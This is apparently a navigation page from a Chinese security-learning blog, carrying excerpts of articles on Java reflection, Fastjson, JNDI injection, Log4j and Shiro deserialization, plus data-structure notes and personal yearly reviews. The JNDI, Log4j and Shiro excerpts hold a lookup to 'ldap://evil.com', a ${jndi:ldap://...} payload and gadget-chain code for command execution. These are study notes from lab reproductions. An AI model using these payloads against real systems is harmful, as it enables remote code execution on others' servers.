    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84/" class="article-link" data-summary="java安全基础-反射 概念 Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。
P神是这样描述的：“反射是大多数语言里都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。⼀段代码，改变其中的变量，将会导致这段代码产生功能性的变化，称之为动态特性。”
反射的实现 JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息；因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息
与反射有关的包/类 与反射有关的包 引入与反射有关的包
import java.lang.reflect.*; 反射中比较重要的类 java.lang.Class
这个类代表着字节码，整个类
java.lang.reflect.Method
代表字节码 (类) 中的成员方法
java.lang.reflect.Constructor
代表字节码 (类) 中的构造方法
java.lang.reflect.Field
代表字节码 (类) 中的成员变量
调用方法 欲要调用一个对象的任意方法，有三步：
获得该对象对应的Class类的实例 通过该Class类的实例来获取欲要调用的那个方法 拿到对应方法后，给该方法传入对应参数进行调用 接下来是具体的实现流程，以如下User类的setName()方法为例：
public class User{ private String name; private int age; @Override public String toString(){ return &amp;amp;#34;User{&amp;amp;#34; &#43; &amp;amp;#34;name=&amp;amp;#34; &#43;name &#43; &amp;amp;#34;, age=&amp;amp;#34;&#43;age&#43;&amp;amp;#34;}&amp;amp;#34;; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 1.获得类实例 方法有三：
">java安全基础-反射</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E7%B1%BB%E5%8A%A0%E8%BD%BD/" class="article-link" data-summary="java安全基础-类加载 简介 Java程序在运行前需要先编译成class文件，java虚拟机（JVM）把描述类文件的数据从.class文件加载到内存，并对数据进行校验、转换、解析和类初始化，最终形成可以被JVM使用的java类型，上述过程中JVM的操作被称为JVM的类加载机制
类的生命周期 类的生命周期，是从加载到 JVM 内存开始，到卸载出 JVM 内存结束
整个生命周期包括：加载、验证、准备、解析、初始化、使用、卸载
而验证、准备、解析三个过程又称为连接
加载 加载即查找并加载类的二进制数据，jvm做了三件事：
通过类的全限定名（包名 &#43; 类名）来获取定义此类的二进制字节流 将该字节流所代表的静态存储结构转化为运行时的数据结构 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入门 注： 连接阶段的部分行为会与加载阶段交叉进行，例如：在加载尚未结束时，就可以对加载成功的部分二进制流进行文件格式验证
验证 确保被加载类的正确性，由于class文件是一个普通文件，可以被修改，验证阶段可以避免不规范的class被jvm使用，从而危害jvm安全，验证内容如下：
文件格式验证
验证字节流是否符合Class文件格式规范
元数据验证
对字节码描述的信息进行语义分析，以保证其描述的信息符合Java语言规范要求
字节码验证
通过数据流和控制流分析，确定程序语义是否合法、符合逻辑
符号引用验证
确保解析动作能正确执行
准备 正式为类的静态变量分配内存，并将其初始化为默认值
这里的默认值是数据类型默认的零值（0、0L、null、false等）而不是代码中所初始化的值，比如：
public static int value = 123; 准备阶段后类变量value的值是0而不是123，因为在准备阶段还没有任何java方法被执行，而给类变量赋值的操作是需要调用类构造器&amp;amp;lt;clinit&amp;amp;gt;()方法中的putstatic指令的
内存分配仅包括类静态变量，实例变量将会在对象实例化时随着对象一起分配到Java堆中
对于同时被static和final修饰的常量，必须在声明的时候就为其显示的赋值；只被final修饰的常量，在使用前必须为其显示的赋值，系统不会为其赋予默认零值，否则IDEA会提示未初始化
解析 把类中的符号引用转换为直接引用。
符号引用：字符串，能根据这个字符串定位到指定的数据，比如java/lang/StringBuilder
直接引用：内存地址或指向对应内存地址的指针、句柄
符号引用就只是一个字面量，与内存结构无关，仅仅通过字面量无法确认该引用在jvm内存中的地址，也就无法使用它，所以必须要将符号引用转换为能够定位到内存地址的直接引用，比如我们要调用System.out.println方法，我们必须要找到println方法在内存中的起始地址，这样才能执行里面的字节码
初始化 执行类构造器&amp;amp;lt;clinit&amp;amp;gt;()方法，对类变量以及类中各种静态代码块中的变量进行赋值操作（这里是类变量初始化，而不是实例初始化）
会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法（defineClass0/1/2）来定义一个java.lang.Class 实例
其中包括：
执行static语句块中的语句 完成static属性的赋值操作 当类的直接父类还没有被初始化，则先初始化其直接父类。 使用 类访问方法区内的数据结构的接口， 对象是堆区上的的数据
卸载 释放内存
JVM结束类生命周期的情况：
执行了System.exit()方法 程序正常执行结束 程序在执行过程中遇到了异常或错误而异常终止 由于操作系统出现错误而导致Java虚拟机进程终止 类的加载时机 JVM会在程序第一次主动引用类的时候加载该类，被动引用时并不会引用类加载的操作
主动引用：
遇到new、getstatic、putstatic、invokestatic
">java安全基础-类加载</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>经典漏洞</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-link" data-summary="Fastjson反序列化漏洞 fastjson算是国内用的比较多的一个组件了，它的反序列化漏洞也是经典中的经典
Fastjson基础 简单使用 Fastjson 是阿里开源的 Java JSON 库，号称“Java 最快 JSON 解析/生成器”，作用就是 把 Java 对象 ↔ JSON 字符串 互相转换，让网络传输、持久化、前后端交互更简单，这个转换过程也就相当于我们常说的序列化与反序列化了
我们可以写一个demo看看，首先添加依赖：
&amp;amp;lt;dependencies&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.alibaba&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;fastjson&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;1.2.50&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;/dependencies&amp;amp;gt; 接下来是demo代码，其中给出了一个java对象，一个json字符串，然后将他们用fastjson的组件来转换：
package com.yuy0ung; import com.alibaba.fastjson.JSON; public class FastJsonDemo { public static void main(String[] args) { // 将一个 Java 对象序列化为 JSON 字符串 Person person = new Person(&amp;amp;#34;Yuy1ung&amp;amp;#34;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // 将一个 JSON 字符串反序列化为 Java 对象 String jsonString2 = &amp;amp;#34;{\&amp;amp;#34;age\&amp;amp;#34;:20,\&amp;amp;#34;name\&amp;amp;#34;:\&amp;amp;#34;Yuy0ung\&amp;amp;#34;}&amp;amp;#34;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() &#43; &amp;amp;#34;, &amp;amp;#34; &#43; person2.getAge()); } // 定义一个简单的 Java 类 public static class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } } } 运行后可以看到Java 对象序列化为 JSON 字符串，JSON 字符串反序列化为 Java 对象：
">Fastjson反序列化漏洞</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/" class="article-link" data-summary="JNDI注入 实战经常遇到，只会打不动原理，现在来浅学一下
JNDI JNDI（Java Naming and Directory Interface）是 Java 为统一访问各种“命名”和“目录”服务而设计的一套标准接口（位于 javax.naming.*）
JNDI设计了一套标准:
服务 功能 JNDI SPI 包 典型 URL LDAP 目录 &#43; 命名 com.sun.jndi.ldap.LdapCtxFactory ldap://host:389/ou=People,dc=example,dc=com DNS 命名 com.sun.jndi.dns.DnsContextFactory dns://8.8.8.8/google.com RMI 远程对象命名 com.sun.jndi.rmi.registry.RegistryContextFactory rmi://host:1099/HelloObj CORBA COS 分布式对象目录 com.sun.jndi.cosnaming.CNCtxFactory corbaname::host:1050#MyService 文件系统 把文件路径当名字 com.sun.jndi.fscontext.RefFSContextFactory file:/tmp/jndiref 这使得所有的命名和目录服务都可以使用同一套代码进行调用；
Context ctx = new InitialContext(); // 初始化上下文 Object obj = ctx.lookup(&amp;amp;#34;ldap://evil.com/a&amp;amp;#34;); // 同一行代码可换任何协议 我们看到这个代码其实已经可以思考了，如果这个lookup方法内的参数可控，那么我们就可以利用JNDI加载任意的java恶意class或恶意反序列化数据
RMI 接下来学习很常用的trick，利用RMI服务来进行JNDI注入
RMIServer 我们先写一个RMIServer：
首先在本机的1099端口起了一个RMI Registry注册表：
LocateRegistry.createRegistry(1099); 然后构造一个恶意对象，此处Reference是 JNDI 提供的对象引用封装，用于告诉客户端应该去http://127.0.0.1:5002/下载class文件，然后用指定工厂类实例化
Reference reference = new Reference( &amp;amp;#34;RMIPoc&amp;amp;#34;, // 类名 &amp;amp;#34;RMIPoc&amp;amp;#34;, // 工厂类名（加载后实例化） &amp;amp;#34;http://127.0.0.1:5002/&amp;amp;#34;); // 远程 codebase（jar/class 下载地址） 接下来把非远程对象 Reference包成远程对象存根ReferenceWrapper，让其能通过 RMI 传输：
">JNDI注入</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/log4j%E6%BC%8F%E6%B4%9E/" class="article-link" data-summary="Log4j漏洞 在https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/，学习了JNDI注入，现在来学一个很经典的JNDI注入：Log4j
Log4j支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出${data:MM-dd-yyyy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi
leader考过我，“这不是一个日志框架么，为什么要支持JNDI查询呢？不是支持日期等基础功能就够了吗？”，后来查阅了一下，Log4j 的 lookup 功能之所以“画蛇添足”地支持 JNDI，早期设计里把它当成一种通用资源定位机制： 开发者想在日志里动态打印任意 Java 对象（数据源、配置项、EJB 引用、JMS 队列名……）时，只要一条 ${jndi:...} 就能让容器去 JNDI 树里查找，省掉自己再写一套 lookup 代码
漏洞复现 在log4j2的2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）版本内存在着JNDI注入的CVE-2021-44228
我们先引入漏洞版本的Log4j：
&amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.apache.logging.log4j&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;log4j-core&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;2.14.1&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.apache.logging.log4j&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;log4j-api&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;2.14.1&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; 然后运行这个demo：
package com.yuy0ung; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Log4jDemo { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { String username = &amp;amp;#34;${jndi:ldap://localhost:9999/LDAPPoc}&amp;amp;#34;; logger.error(&amp;amp;#34;hello {}&amp;amp;#34;,username); } } 成功执行命令
">Log4j漏洞</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-link" data-summary="shiro反序列化漏洞 shiro是一个通用的鉴权框架，而它有一个很经典的漏洞：shiro反序列化
简单讲讲漏洞原理：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。
但是在Shiro 1.2.4版本之前内置了一个默认且固定的AES加密Key，而cookie的生成逻辑也很清晰：序列化字符串&#43;AES 加密&#43;base64 加密，所以攻击者可以按照这个逻辑伪造任意的rememberMe Cookie，进而触发反序列化漏洞
所以这里不分析原理了，来分析一下payload的构造
TemplatesImpl在shiro中的利用 如果经过尝试的话，会发现CommonsCollections6是无法在shiro中利用的，这是因为如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误，而CC6中用到了transformer数组，所以无法利用，那么我们接下来就尝试用TemplatesImpl构造一个无数组的payload
在分析CC6前有一个newTransformer的方法如下：
Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(&amp;amp;#34;newTransformer&amp;amp;#34;, null, null) }; 这里使用了数组，我们需要用其他方法替代掉
CC6中用到的TiedMapEntry类有一个getValue方法，这里调用了map的get方法，并传入key：
而这个get方法就是LazyMap的触发点：
我们注意到，这个 LazyMap#get 的参数key，会被传进transform()，也就是说我们可以尝试用它来替代ConstantTransformer()的作用，这样一来数组中只剩一个元素，那么自然就不需要数组了，接下来尝试构造payload
构造（CommonsCollectionsK1） 在CC6的基础上修改，同样使用javassist来生成命令执行弹出计算器的字节码，并且创建InvokerTransformer时先传入的无用方法getClass，等到序列化时再反射修改为newTransformer，关键代码如下：
byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, &amp;amp;#34;_bytecodes&amp;amp;#34;, new byte[][] {code}); setFieldValue(tmpl, &amp;amp;#34;_name&amp;amp;#34;, &amp;amp;#34;HelloTemplatesImpl&amp;amp;#34;); setFieldValue(tmpl, &amp;amp;#34;_tfactory&amp;amp;#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(&amp;amp;#34;getClass&amp;amp;#34;, null, null); Map innerMap = new HashMap(); innerMap.put(&amp;amp;#34;value&amp;amp;#34;, &amp;amp;#34;Yuy0ung&amp;amp;#34;); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl); Map evilMap = new HashMap(); evilMap.put(tme,&amp;amp;#34;Yuy1ung&amp;amp;#34;); outerMap.clear(); setFieldValue(transformer, &amp;amp;#34;iMethodName&amp;amp;#34;, &amp;amp;#34;newTransformer&amp;amp;#34;); 这里要注意的是最终的payload的加密和编码操作，为了避免出错可以直接使用shiro库中的加密和编码，最终payload如下：
">shiro反序列化漏洞</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>数据结构</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88%E9%98%9F%E5%88%97%E5%92%8C%E6%95%B0%E7%BB%84%E4%B8%8E%E4%B8%B2/" class="article-link" data-summary="数据结构之栈、队列和数组 第三章_栈、队列和数组 本章介绍的两种数据结构栈和队列在逻辑结构上都属于线性结构，只不过是操作受限的线性表。
3.1 栈 3.1.1 栈的基本概念 栈（stack） 是仅允许在一端进行插入和删除操作的线性表。
在写C语言时，函数销毁创建本质就是依赖于栈这一数据结构。特点是后进先出（Last In First Out，LIFO） 下面介绍栈的三个基本属性以及示意图：
栈顶（Top）： 允许进行插入和删除操作的这一端。 栈底（Bottom）： 固定不变，不允许进行插入和删除操作的这一端。 空栈： 不含任何元素的栈。 3.1.2 栈的基本操作 采用严蔚敏版的命名规范：
InitStack(&amp;amp;amp;S)：初始化一个空栈S。 DestroyStack(&amp;amp;amp;S)：销毁栈S，释放其存储空间。 Pop(&amp;amp;amp;S,x)：入栈操作，若栈未满，则x成为新的栈顶元素。 Push(&amp;amp;amp;S,x)：出栈操作，若栈非空，则弹出栈顶元素，并通过x返回该值。 GetTop(S,&amp;amp;amp;x)：读取栈顶元素但不出栈，若栈非空，则通过x返回值。 StackEmpty(S)：判断栈是否为空，为空返回True，否则返回False。 3.1.3 栈的数学性质 栈的数学性质： 当n个不同的元素按固定次序入栈时，可能的出栈序列的总数为 1/(n&#43;1)Cn2n，该数列也被称为卡特兰数。（做题时很好用）
3.1.4 顺序栈 3.1.3.1 顺序栈的定义 采用顺序存储的栈称为顺序栈，它利用一组连续的存储单元存放从栈顶到栈底的数据元素，并附设一个整型指针（top） 指向当前栈顶元素位置。
与线性表类似，栈也有两种基本的存储方式：顺序存储和链式存储。
3.1.3.2 顺序栈的实现和基本操作 下面介绍顺序栈。基于top指针的指向方式，栈其实存在两种操作方式：1. top 表示当前栈顶元素的下标，2. top 表示“下一个可存放元素的位置”。由于和《数据结构之绪论与线性表》中的代码大致都相同，也很简单，这里直接用代码说明顺序栈的实现和基本操作。
1. top 表示当前栈顶元素的下标: 注意top指针在这种情况下初始化为 -1。在做题时，S.data[&#43;&#43;top]; 等代码的 &#43;&#43;top 和 top&#43;&#43;，两种情况表示不同，一定理解记忆是哪种情况。
#define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; #include &amp;amp;lt;stdlib.h&amp;amp;gt; # define MaxSize 50 typedef struct { Elemtype data[MaxSize]; int top; }SqStack; void InitStack(SqStack&amp;amp;amp; S) { S.top = -1; //注意这里初始化为-1 } bool StackEmpty(SqStack &amp;amp;amp;S) { if (S.top == -1) { return true; } return false; } bool Push(SqStack &amp;amp;amp;S, Elemtype x) { if (S.top == MaxSize - 1) { //栈满，不能插入 return false; } //下面两行等价于S.data[&#43;&#43;top]=x; 做题时注意区分 S.top&#43;&#43;; S.data[S.top] = x; return true; } bool Pop(SqStack&amp;amp;amp; S, Elemtype &amp;amp;amp;x) { if (S.top == -1) { //栈为空，无法删除 return false; } x = S.data[S.top--]; return true; } bool GetTop(SqStack &amp;amp;amp;S, Elemtype &amp;amp;amp;e) { if (S.top == -1) { //栈为空，无法读取 return false; } e = S.data[S.top]; return true; } 2. top 表示“下一个可存放元素的位置” 注意一开始 top 指针置为 0
">数据结构之栈、队列和数组与串</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BB%AA%E8%AE%BA%E4%B8%8E%E7%BA%BF%E6%80%A7%E8%A1%A8/" class="article-link" data-summary="数据结构之绪论与线性表 第一章_绪论 1.1 数据结构在学什么 如何用程序代码把现实世界的问题信息化 如何用计算机高效地处理这些信息从而创造价值 只有详细学习过这四门课的人才能够更好理解信息化，这也是计算机专业的学生和只会写代码的人的区别所在 1.2 数据结构的基本概念 本小节会对数据结构中的基本概念做简单讲解，目的在于了解和理解概念，具体的深入了解会在后面的章节中提到，本小节的思维导图如下： 1.2.1 基本概念 1.2.1.1 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。
简单来看，在计算机的世界中，数据就是0和1
1.2.1.2 数据元素、数据项 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位
其实什么是数据元素什么是数据项，得根据实际的业务需求来确定，比如以微博举例：每一个账号为一个数据元素，而账号里的每一个信息为一个数据项： 1.2.1.3 数据结构、数据对象 数据结构是相互之间存在一种或者多种特定关系的数据元素的集合，数据对象是具有相同性质的数据元素的集合。
其实简单理解就是数据对象是一堆相同性质的数据集合，而数据结构是在数据对象的基础上，还规定了数据结构的三要素&amp;amp;ndash;逻辑关系，存储结构，数据的运算。
1.2.1.4 数据类型、抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。分为原子类型（其值不可再分的数据类型）和结构类型（其值可以分解成若干成分的数据类型）
抽象数据类型(Abstract Data Type,ADT) 是抽象数据组织及与之相关的操作
若从数据结构的三要素来进行讨论，数据类型和抽象数据类型都只是实现了逻辑结构和数据的运算，不涉及具体的存储结构和实现细节。
1.2.2 数据结构三要素 非常重要，我们再数据结构的学习中，任何涉及到数据结构的地方，首先想到的就应该是三要素
1.2.2.1 逻辑结构 数据的逻辑结构只分为以下的四种结构，在考研数据结构中主要是讨论后三种逻辑结构：
集合：各个数据元素同属一个集合，之间没有任何关系。 线性结构：数据元素之间是一对一的关系，除了第一个元素，所有的元素都有唯一前驱，除了最后一个元素，任何元素都有唯一后继 树形结构，就像树枝一样，数据元素之间是一对多的关系，比如本小节开始给的思维导图就是树形结构的关系 图结构：数据元素之间存在多对多的关系，像一张网一样。 1.2.2.2 存储结构（物理结构） 数据的存储结构（物理结构）是指数据在计算机内存中的存储方式，常见有以下四种：
顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现，要求给数据元素分配的是一片连续的内存空间，就像C语言中的数组。 链式存储：逻辑上相邻的元素可能在物理位置上表示不相邻，借助指示元素存储地址的指针来表示元素间的逻辑地址关系，就像C语言中的链表。 索引存储：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。就像操作系统中分页存储中的页表。 散列存储：根据元素的关键字通过散列函数直接计算出元素的存储地址，又称哈希(Hash)存储。具体比较复杂，后面在做讲解，这里了解就好。 1.2.2.3 数据的运算 数据的运算是施加在数据上的运算，包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。
主要就是数据结构的创销，增删改查。
数据的运算（“能对数据做什么”） │ ├── 运算的定义（面向逻辑结构） │ ├── 插入 │ ├── 删除 │ ├── 查找 │ ├── 修改 │ └── 遍历 │ └── 运算的实现（面向存储结构） ├── 顺序存储：移动元素 / 下标访问 ├── 链式存储：修改指针 ├── 索引存储：先查索引再访问数据 └── 散列存储：通过散列函数定位 1.3 算法的基本概念 算法（Algorithm）是对特定问题求解步骤的描述，是一个有穷的指令序列，其中每条指令表示一个或者多个操作。
">数据结构之绪论与线性表</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>杂谈</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%9D%82%E8%B0%88/yuy0ung%E7%9A%842024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" class="article-link" data-summary="转眼就2025年了，是时候回顾一下2024究竟干了什么了
寒假（初入D0g3） 2024年初，经过层层面试，终于如愿以偿加入了道格安全研究实验室，回想当时还是一个只会top10、能打打CTF的孩子，但是在加入了这个实验室之后，我的WEB之路也算是步入了正轨，寒假狠狠的刷了一波CTFSHOW、和实验室的师傅们一起开周会交流技术、还和师傅们一起打比赛（还记得当时有beginCTF和Hgame两场个人赛😁），感觉每一天都有知识进入脑子，非常充实
翻了翻相册，发现还有那段时间的照片：
D0g3三面时候的招新赛，短暂的第一（结束的时候下面那位叫“约束集”的re师傅超过了）：
寒假忙里偷闲，摸鱼画画：
那段时间搭的博客（二次元show show way）：
打Hgame的week2，RCE的题被我当成SSTI了：
大一下（渐入佳境） 开学之后，学长们又对我们的技术进行了考核，面对面拷打了我们一顿，也算是认识到自己的不足了，于是继续不停的学习，获取知识的途径我也是越来越多，这期间当然也少不了熬夜学习：
这段时间的状态也是极好，早早的来到实验室，一坐就是一天，晚上11点才走，实验室还配了一张床，中午困了床上一躺就睡，非常惬意
然后又是各种比赛，印象最深的就是XYCTF了，misc的社工被我拿了一血，团队最终排名定格在第9名，获得了官方送的贴纸（最成功的一集）
先知沙龙成都站开在我们学校：
我的帅气签名：
先知有一个课题是有关ADDS渗透中的防御规避，当时还没有开始学习域渗透听不太懂，但兴趣蛮大，于是这段时间就开始入门后渗透的各种知识了，对权限提升尤其感兴趣
然后乘着学校放假，溜到长沙去玩了，看我在杜甫江阁的帅照（对面就是橘子洲）：
但是去长沙耽误了ISCC，师傅们都拿了1等奖，就我拿的三等奖QAQ
回来之后继续捣鼓技术，中途服务器过期了，用博客园重新搭了个博客：
然后就是蓝桥杯，人生第一次线下CTF（虽然没有含金量，参赛还得交钱，幸好学校报销）：
在此之后，做出了一个很正确的选择，加入山海关安全团队，和里面的师傅共同进步！
暑假（继续沉淀） 算是正式学习渗透了，刷掉了DC1-9和红日1-5的靶机，摸清了后渗透基本流程，完事开始系统学习个流程的手法和姿势，期间也是认识了一些很强的佬，有他们监督、指点真的非常开心
暑假最好玩的事情就是去上海参加全球开源极客嘉年华了，见识了大城市的繁华，也收获了很多：
我的入会牌：
现场送的周边：
非常nice的氛围：
和同行师傅逛上海，他太高了190QAQ：
只能说非常有意义的暑假，见到很多，学到很多👍
大二上（崭露头角?） 正式成为一名学长，除了自己需要坚持学习，还需要监督和指导小登们学习，变成了学弟学妹口中的Y师傅🤭
要说技术，就是中规中矩稳定进步，倒是线下比赛又打了俩：
首先就是四川省赛”安恒杯“：
哥的参赛牌：
中规中矩，16名二等奖：
然后和山海关的师傅一起去南京参加第七届强网拟态防御国际精英挑战赛：
紫金山实验室真的很高级：
战队介绍怎么还把我们照片挂上去了QAQ：
中规中矩，拿下拿下：
逛逛南京，玄武湖的风很大
">Yuy0ung的2024年度总结</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%9D%82%E8%B0%88/yuy0ung%E7%9A%842025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" class="article-link" data-summary="Yuy0ung的2025年度总结 “哀吾生之须臾，羡长江之无穷。”
突然就年底了，上次写年度总结感觉还是在昨天，感慨万分
20岁的我，能够很清晰的感觉到自己的青春正在慢慢流逝，没有了对梦想的激情，也没有了很多头发，或许在变强的路上总需要失去些什么
现在的我不算成功，还是没有稳定的工作，没有足够的财富，也没有倾诉的对象，不过我向前走的路途是有趣的，可以向你分享一二
线下赛 在大二下的时候，抓住最后的时间打了一些比赛拿了些奖，线上的太多就不说了，说说我去的线下比赛吧
重庆：第一站 全国大学生软件创新大赛&amp;amp;ndash;软件系统安全赛，这是2025年的第一场线下比赛，紧张刺激，最后混了个三等奖（没晋级），遗憾离场，不过更重要的是赛前赛后和兄弟们一起相处的那段时间，一起玩过的地方和一起吃过的重庆火锅（试了一下没有传说中那么辣，无感）：
杭州：西湖论剑 一周过后，Yuy0ung就马不停蹄的赶往了第二站：杭州，比赛同样只是混了个三等奖，不过西湖的风也算是抚平了不满足的心，看西湖的那天下雨了，没能看到所谓的杨柳岸晓风残月，就去了一个杭帮菜饭店避雨，顺便就吃了些当地的美食，那个西湖醋鱼真的很一般，其他的菜还不错，很鲜：
不过到这里，道格安全研究实验室的接力棒也是交接到了学弟学妹的手中，我的今年的CTF线下之旅也算是结束了，没有什么精彩事迹，没有什么主角光环，不过是井底之蛙消散于大海之中
学无止境 参加了很多的线下安全沙龙/知识讲座，每次去都是乡下人进城，每次去都能见到很多大佬，每次去都能学到很多
腾讯安全沙龙 缝刃无影，御见未来，很帅的名字，在这里影响比较深的就是场地了，竟然是酒吧，不得不佩服腾讯的选地，另外，联想红队的外国师傅分享的近源窃听技术以及腾讯云鼎网安实验室的师傅分享的aksk利用，不创建新用户登录控制台，这两个trick另我印象深刻：
